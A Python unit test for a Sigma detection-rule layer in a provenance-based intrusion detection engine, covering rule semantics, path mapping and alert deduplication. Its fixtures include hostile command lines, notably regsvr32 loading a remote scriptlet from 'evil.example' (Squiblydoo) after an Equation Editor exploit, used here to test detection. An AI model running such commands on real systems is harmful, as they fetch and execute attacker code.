"""0.12 Sigma layer (pdp_engine.sigma) on synthetic provenance windows: rule semantics, field mapping, no duplicates.
Run: PYTHONPATH=engine python tests/unit/test_sigma.py"""
import json
import sys

import numpy as np

from pdp_engine import sigma as S
from pdp_engine.layers import DeterministicLayers, ALWAYS_EVIDENCE
from pdp_engine.schema import EDGE_TYPE_ID, Entity, Registry
from pdp_engine.windows import Window

fails = 0


def check(cond, msg):
    global fails
    print(("PASS " if cond else "FAIL ") + msg)
    fails += 0 if cond else 1


data = json.load(open(S.RULES_FILE))
check(data["release"] == "r2026-07-01" and len(data["rules"]) > 1000 and "Detection Rule License" in data["license"],
      f"compiled SigmaHQ {data['release']}: {len(data['rules'])} rules, licence recorded")
check(all(r["category"] in ("process_creation", "image_load", "file_event", "network_connection") for r in data["rules"]),
      "only categories the telemetry records")

# matcher semantics on hand-written rules (Sigma specification)
sys.path.insert(0, "server")
from pdp_server.tools.sigma_compile import compile_rule, Unsupported  # noqa: E402


def R(det, cat="process_creation", product="windows", level="high"):
    return S.SigmaRule(compile_rule({"id": "t", "title": "t", "level": level, "status": "test",
                                     "logsource": {"product": product, "category": cat}, "detection": det}, "x"))


r = R({"sel": {"Image|endswith": "\\regsvr32.exe", "CommandLine|contains|all": ["/i:http", "scrobj"]}, "condition": "sel"})
check(r.match({"Image": "c:\\windows\\system32\\REGSVR32.EXE", "CommandLine": "regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll"}),
      "endswith + contains|all, case-insensitive")
check(not r.match({"Image": "c:\\windows\\system32\\regsvr32.exe", "CommandLine": "regsvr32 /s x.dll"}), "|all needs every value")
check(not r.match({"Image": "c:\\windows\\system32\\regsvr32.exe"}), "absent field: no match")
r = R({"sel": {"ParentImage|endswith": ["\\winword.exe", "\\excel.exe"], "Image|endswith": ["\\cmd.exe", "\\powershell.exe"]},
       "filter": {"CommandLine|contains": "benign"}, "condition": "sel and not filter"})
check(r.parent and r.match({"Image": "c:\\w\\cmd.exe", "ParentImage": "c:\\o\\WINWORD.EXE", "CommandLine": "cmd /c x"}),
      "selection and not filter; a ParentImage rule marks the parent")
check(not r.match({"Image": "c:\\w\\cmd.exe", "ParentImage": "c:\\o\\winword.exe", "CommandLine": "cmd benign"}), "filter excludes")
r = R({"selection_a": {"Image|endswith": "\\a.exe"}, "selection_b": {"CommandLine|contains": "-enc"}, "condition": "1 of selection_*"})
check(r.match({"Image": "c:\\a.exe"}) and r.match({"Image": "c:\\b.exe", "CommandLine": "x -enc y"}), "1 of selection_*")
r = R({"sel": {"CommandLine|windash|contains": " -enc "}, "condition": "sel"})
check(r.match({"Image": "\\p.exe", "CommandLine": "p /enc abc"}) and r.match({"Image": "\\p.exe", "CommandLine": "p \u2013enc abc"}), "windash")
r = R({"sel": {"CommandLine": "*\\temp\\\\*.exe"}, "condition": "sel"})   # Sigma: '*\temp\\*.exe' 
check(r.match({"Image": "\\p.exe", "CommandLine": "C:\\Users\\x\\AppData\\Local\\Temp\\evil.exe"}), "wildcards in a plain value")
r = R({"sel": {"DestinationIp|cidr": "10.0.0.0/8", "Initiated": "true"}, "condition": "sel"}, cat="network_connection")
check(r.match({"Image": "\\p.exe", "DestinationIp": "10.1.2.3", "Initiated": "true"}) and not r.match({"Image": "\\p.exe", "DestinationIp": "8.8.8.8", "Initiated": "true"}), "cidr")
try:
    compile_rule({"id": "t", "title": "t", "level": "high", "logsource": {"product": "windows", "category": "process_creation"},
                  "detection": {"sel": {"Image|endswith": "\\x.exe"}, "filter": {"Signed": "true"}, "condition": "sel and not filter"}}, "x")
    check(False, "a filter on a field the telemetry lacks excludes the rule")
except Unsupported:
    check(True, "a filter on a field the telemetry lacks excludes the rule")

# paths
check(S.win_path("/Device/HarddiskVolume1/Windows/System32/PING.EXE") == "c:\\Windows\\System32\\PING.EXE", "NT device path -> c:\\")
check(S.win_path("net.exe") == "\\net.exe" and S.is_windows_path("net.exe") and not S.is_windows_path("/usr/bin/bash"), "bare names, OS")

# the layer on a provenance window: Equation Editor -> regsvr32 /i:http ... scrobj.dll (CVE-2017-11882 + Squiblydoo)
ents = [Entity("u0", "subject", "subject c:\\program files\\common files\\microsoft shared\\equation\\eqnedt32.exe None"),
        Entity("u1", "subject", "subject c:\\windows\\system32\\regsvr32.exe regsvr32 /s /n /u /i:http://evil.example:8080/x.sct scrobj.dll"),
        Entity("u2", "file", "file c:\\windows\\system32\\scrobj.dll"),
        Entity("u3", "subject", "subject c:\\windows\\system32\\regsvr32.exe regsvr32 /s /n /u /i:http://evil.example:8080/y.sct scrobj.dll"),
        Entity("u4", "netflow", "netflow 203.0.113.9 8080")]
reg = Registry()
for e in ents:
    reg.add(e)


def win(edges, t0=0):
    src = np.array([a for a, _, _ in edges]); dst = np.array([b for _, b, _ in edges])
    et = np.array([EDGE_TYPE_ID[o] for _, _, o in edges]); t = np.arange(len(edges)) + t0
    return Window(t0, t0 + 10**9, src, dst, t, et, [str(i) for i in range(len(edges))])


lay = S.SigmaLayer(("high", "critical"))
hits = lay.process(win([(0, 1, "CLONE"), (2, 1, "READ"), (1, 4, "CONNECT")]), reg)
names = {h.detail.split("'")[1] for h in hits}
check(any("Office Child Process" in n for n in names), f"Office / Equation Editor child-process rule fires ({names})")
check(any(1 in h.nodes for h in hits) and any(0 in h.nodes for h in hits), "the child and, for parent rules, the parent are marked")
check(all(h.layer == "rules" and h.rule == "sigma" for h in hits), "layer rules, rule sigma")
again = lay.process(win([(0, 3, "CLONE"), (2, 3, "READ")], t0=10**10), reg)
check(not [h for h in again if h.key.split(":")[0] in {x.key.split(":")[0] for x in hits} and h.key in {x.key for x in hits}],
      "no duplicates: the same rule and program alert once per day")
known = S.SigmaLayer.fit([[win([(0, 1, "CLONE"), (2, 1, "READ")])]], reg)
lay2 = S.SigmaLayer(("high", "critical"), known=known)
h2 = lay2.process(win([(0, 1, "CLONE"), (2, 1, "READ")]), reg)
check(h2 and all(h.rule == "sigma_known" for h in h2) and "sigma_known" in ALWAYS_EVIDENCE,
      "matched during the baseline: evidence (sigma_known), alerts only with learned corroboration")
# a process recorded without a folder (OpTC 'dwm.exe'): the folder is unknown, so location rules must not fire
reg2 = Registry()
for e in [Entity("p", "subject", "subject winlogon.exe None"), Entity("c", "subject", "subject dwm.exe None")]:
    reg2.add(e)
loc = [h for h in S.SigmaLayer(("high", "critical")).process(win([(0, 1, "CLONE")]), reg2) if "Location Anomaly" in h.detail]
pre = [h for h in S.SigmaLayer(("high", "critical"), bare_names="prefix").process(win([(0, 1, "CLONE")]), reg2) if "Location Anomaly" in h.detail]
check(not loc and pre, "bare program names: Image absent by default (no made-up location); the old 'prefix' mapping fired")
dl = DeterministicLayers({"known_executables": [], "config": {"novelty": False, "rules": False}}, 0)
check(dl.sigma is None, "off unless configured")
dl.set_sigma(("high", "critical"))
check(len(dl.process(win([(0, 1, "CLONE"), (2, 1, "READ")]), reg, np.array([0, 1, 2]))) > 0, "runs inside the deterministic layers")
print("FAILURES:", fails)
sys.exit(1 if fails else 0)
